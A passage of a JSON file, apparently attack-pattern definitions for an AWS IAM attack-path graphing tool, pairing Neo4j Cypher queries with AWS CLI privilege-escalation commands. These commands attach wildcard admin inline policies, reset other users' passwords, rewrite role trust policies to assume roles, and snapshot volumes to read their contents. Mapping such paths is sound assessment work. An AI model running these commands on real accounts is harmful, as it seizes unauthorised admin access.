commands MERGE (pattern)-[edge:CREATE{Name:'AssumeRole'}]->(grant) ON CREATE SET  edge.Description = \"Creates a new role that can be assumed.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "CreateSnapshot": {
    "Description": "Creates a snapshot of an EBS volume and stores it in Amazon S3.",
    "Commands": [
      "aws ec2 create-snapshot ${AWS::EC2::Volume}",
      "aws ec2 run-instances --block-device-mapping \"DeviceName=/dev/sda2,Ebs={SnapshotId=${AWS::EC2::Volume}}\""
    ],
    "Attack": {
      "Requires": [
        "ec2:CreateSnapshot",
        "ec2:RunInstances"
      ],
      "Affects": "AWS::EC2::Volume"
    },
    "Grants": "ReadFileSystem",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::EC2::Volume`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['ec2:CreateSnapshot', 'ec2:RunInstances'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 2 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateSnapshot'}]-> (pattern:Pattern:CreateSnapshot{Name:'CreateSnapshot'}) ON CREATE SET  pattern.Requires = ['ec2:CreateSnapshot', 'ec2:RunInstances'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws ec2 create-snapshot ${AWS::EC2::Volume}', 'aws ec2 run-instances --block-device-mapping \"DeviceName=/dev/sda2,Ebs={SnapshotId=${AWS::EC2::Volume}}\"']|REPLACE(REPLACE(_, \"${AWS::EC2::Volume}\", grant.Name), \"${AWS::EC2::Volume}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'ReadFileSystem'}]->(grant) ON CREATE SET  edge.Description = \"Creates a snapshot of an EBS volume and stores it in Amazon S3.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "CreateUserLoginProfile": {
    "Description": "Set the password for the specified IAM user.",
    "Commands": [
      "aws iam create-login-profile --user-name ${AWS::IAM::User} --password $new-password "
    ],
    "Attack": {
      "Requires": [
        "iam:CreateLoginProfile"
      ],
      "Affects": "AWS::IAM::User",
      "Cypher": [
        "${AWS::IAM::User}.LoginProfile IS NULL"
      ]
    },
    "Grants": "SetPassword",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:CreateLoginProfile', Effect: 'Allow'}]->(target:`AWS::IAM::User`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL  AND target.LoginProfile IS NULL WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateUserLoginProfile'}]-> (pattern:Pattern:CreateUserLoginProfile{Name:'CreateUserLoginProfile'}) ON CREATE SET  pattern.Requires = ['iam:CreateLoginProfile'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam create-login-profile --user-name ${AWS::IAM::User} --password $new-password ']|REPLACE(_, \"${AWS::IAM::User}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'SetPassword'}]->(grant) ON CREATE SET  edge.Description = \"Set the password for the specified IAM user.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "PutGroupPolicy": {
    "Description": "Adds or updates an inline policy document that is embedded in the specified IAM group.",
    "Options": [
      "Admin"
    ],
    "Commands": [
      "aws iam put-group-policy --group-name ${AWS::IAM::Group} --policy-name Admin --policy-document file://<(cat <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Admin\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n}\nEOF\n)"
    ],
    "Attack": {
      "Depends": "AWS::IAM::Group",
      "Requires": [
        "iam:PutGroupPolicy"
      ],
      "Affects": "AWS::IAM::Group"
    },
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::Group`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Group`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:PutGroupPolicy'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'PutGroupPolicy'}]-> (pattern:Pattern:PutGroupPolicy{Name:'PutGroupPolicy'}) ON CREATE SET  pattern.Requires = ['iam:PutGroupPolicy'], pattern.Depends = \"AWS::IAM::Group\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam put-group-policy --group-name ${AWS::IAM::Group} --policy-name Admin --policy-document file://<(cat <<EOF\\n{\\n    \"Version\": \"2012-10-17\",\\n    \"Statement\": [\\n        {\\n            \"Sid\": \"Admin\",\\n            \"Effect\": \"Allow\",\\n            \"Action\": \"*\",\\n            \"Resource\": \"*\"\\n        }]\\n}\\nEOF\\n)']|REPLACE(_, \"${AWS::IAM::Group}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ADMIN{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Adds or updates an inline policy document that is embedded in the specified IAM group.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "PutRolePolicy": {
    "Description": "Adds or updates an inline policy document that is embedded in the specified IAM role.",
    "Options": [
      "Admin"
    ],
    "Commands": [
      "aws iam put-role-policy --role-name ${AWS::IAM::Role} --policy-name Admin --policy-document file://<(cat <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Admin\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n}\nEOF\n)"
    ],
    "Attack": {
      "Depends": "AWS::IAM::Role",
      "Requires": [
        "iam:PutRolePolicy"
      ],
      "Affects": "AWS::IAM::Role"
    },
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::Role`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Role`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:PutRolePolicy'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'PutRolePolicy'}]-> (pattern:Pattern:PutRolePolicy{Name:'PutRolePolicy'}) ON CREATE SET  pattern.Requires = ['iam:PutRolePolicy'], pattern.Depends = \"AWS::IAM::Role\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam put-role-policy --role-name ${AWS::IAM::Role} --policy-name Admin --policy-document file://<(cat <<EOF\\n{\\n    \"Version\": \"2012-10-17\",\\n    \"Statement\": [\\n        {\\n            \"Sid\": \"Admin\",\\n            \"Effect\": \"Allow\",\\n            \"Action\": \"*\",\\n            \"Resource\": \"*\"\\n        }]\\n}\\nEOF\\n)']|REPLACE(_, \"${AWS::IAM::Role}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ADMIN{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Adds or updates an inline policy document that is embedded in the specified IAM role.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "PutUserPolicy": {
    "Description": "Adds or updates an inline policy document that is embedded in the specified IAM user.",
    "Options": [
      "Admin"
    ],
    "Commands": [
      "aws iam put-user-policy --user-name ${AWS::IAM::User} --policy-name Admin --policy-document file://<(cat <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Admin\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n}\nEOF\n)"
    ],
    "Attack": {
      "Depends": "AWS::IAM::User",
      "Requires": [
        "iam:PutUserPolicy"
      ],
      "Affects": "AWS::IAM::User"
    },
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::User`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::User`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:PutUserPolicy'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'PutUserPolicy'}]-> (pattern:Pattern:PutUserPolicy{Name:'PutUserPolicy'}) ON CREATE SET  pattern.Requires = ['iam:PutUserPolicy'], pattern.Depends = \"AWS::IAM::User\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam put-user-policy --user-name ${AWS::IAM::User} --policy-name Admin --policy-document file://<(cat <<EOF\\n{\\n    \"Version\": \"2012-10-17\",\\n    \"Statement\": [\\n        {\\n            \"Sid\": \"Admin\",\\n            \"Effect\": \"Allow\",\\n            \"Action\": \"*\",\\n            \"Resource\": \"*\"\\n        }]\\n}\\nEOF\\n)']|REPLACE(_, \"${AWS::IAM::User}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ADMIN{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Adds or updates an inline policy document that is embedded in the specified IAM user.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "UpdateRole": {
    "Description": "Updates the policy that grants an IAM entity permission to assume a role.",
    "Commands": [
      "aws iam update-assume-role-policy --role-name ${AWS::IAM::Role} --policy-document *",
      "aws sts assume-role --role-arn ${AWS::IAM::Role}.Arn --role-session-name AssumeRole"
    ],
    "Attack": {
      "Requires": [
        "iam:UpdateAssumeRolePolicy"
      ],
      "Affects": "AWS::IAM::Role"
    },
    "Grants": "AssumeRole",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:UpdateAssumeRolePolicy', Effect: 'Allow'}]->(target:`AWS::IAM::Role`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'UpdateRole'}]-> (pattern:Pattern:UpdateRole{Name:'UpdateRole'}) ON CREATE SET  pattern.Requires = ['iam:UpdateAssumeRolePolicy'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam update-assume-role-policy --role-name ${AWS::IAM::Role} --policy-document *', 'aws sts assume-role --role-arn ${AWS::IAM::Role}.Arn --role-session-name AssumeRole']|REPLACE(REPLACE(_, \"${AWS::IAM::Role}.Arn\", grant.Arn), \"${AWS::IAM::Role}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'AssumeRole'}]->(grant) ON CREATE SET  edge.Description = \"Updates the policy that grants an IAM entity permission to assume a role.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "UpdateUserLoginProfile": {
    "Description": "Changes the password for the specified IAM user.",
    "Commands": [
      "aws iam update-login-profile --user-name ${AWS::IAM::User} --password $new-password "
    ],
    "Attack": {
      "Requires": [
        "iam:UpdateLoginProfile"
      ],
      "Affects": "AWS::IAM::User"
    },
    "Grants": "ChangePassword",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:UpdateLoginProfile', Effect: 'Allow'}]->(target:`AWS::IAM::User`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'UpdateUserLoginProfile'}]-> (pattern:Pattern:UpdateUserLoginProfile{Name:'UpdateUserLoginProfile'}) ON CREATE SET  pattern.Requires = ['iam:UpdateLoginProfile'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam update-login-profile --user-name ${AWS::IAM::User} --password $new-password ']|REPLACE(_, \"${AWS::IAM::User}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'ChangePassword'}]->(grant) ON CREATE 